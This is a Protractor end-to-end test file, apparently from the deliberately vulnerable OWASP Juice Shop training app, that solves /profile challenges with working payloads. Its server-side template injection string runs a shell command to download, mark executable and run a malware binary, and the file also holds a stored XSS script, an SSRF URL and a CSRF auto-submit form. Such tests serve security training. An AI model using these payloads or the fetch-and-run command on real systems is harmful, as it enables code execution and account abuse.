/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')
const utils = require('../../lib/utils')

describe('/profile', () => {
  let username, submitButton, url, setButton

  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "ssti"', () => {
      it('should be possible to inject arbitrary nodeJs commands in username', () => {
        browser.waitForAngularEnabled(false)
        browser.get('/profile')
        username = element(by.id('username'))
        submitButton = element(by.id('submit'))
        username.sendKeys('#{global.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
        submitButton.click()
        browser.get('/')
        browser.driver.sleep(5000)
        browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'SSTi' })
    })

    describe('challenge "usernameXss"', () => {
      it('Username field should be susceptible to XSS attacks', () => {
        browser.waitForAngularEnabled(false)
        browser.get('/profile')

        const EC = protractor.ExpectedConditions
        username = element(by.id('username'))
        setButton = element(by.id('submit'))
        username.sendKeys('<<a|ascript>alert(`xss`)</script>')
        setButton.click()
        browser.wait(EC.alertIsPresent(), 10000, "'xss' alert is not present on /profile")
        browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual('xss')
          alert.accept()
        })
        username.sendKeys('αδмιη') // disarm XSS
        setButton.click()
        browser.get('/')
        browser.driver.sleep(10000)
        browser.waitForAngularEnabled(true)
      })
      protractor.expect.challengeSolved({ challenge: 'Classic Stored XSS' })
    })
  }

  describe('challenge "ssrf"', () => {
    it('should be possible to request internal resources using image upload URL', () => {
      browser.waitForAngularEnabled(false)
      browser.get('/profile')
      url = element(by.id('url'))
      submitButton = element(by.id('submitUrl'))
      url.sendKeys('http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
      submitButton.click()
      browser.get('/')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'SSRF' })
  })

  describe('challenge "csrf"', () => {
    it('should be possible to perform a CSRF attack against the user profile page', () => {
      browser.waitForAngularEnabled(false)
      browser.driver.get('http://htmledit.squarefree.com')
      browser.driver.sleep(1000)
      /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
      /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
      browser.executeScript("document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = \"<form action=\\\"http://localhost:3000/profile\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"username\\\" value=\\\"CSRF\\\"/><input type=\\\"submit\\\"/></form><script>document.forms[0].submit();</script>\"")
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'CSRF' })
  })
})
